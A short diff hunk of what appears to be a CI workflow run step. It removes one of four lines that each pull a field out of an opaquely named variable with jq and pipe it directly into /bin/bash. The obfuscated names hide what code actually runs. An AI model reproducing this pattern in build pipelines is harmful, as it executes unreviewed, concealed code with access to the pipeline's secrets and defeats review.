@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$rf4281" | jq -r .gs311 | /bin/bash
           printf '%s' "$iawgv0432" | jq -r .f792 | /bin/bash
-          echo $lqucd6 | jq -r .b80640 | /bin/bash
           echo $pkkbc5 | jq -r .g4475 | /bin/bash
 
       - name: Archive results
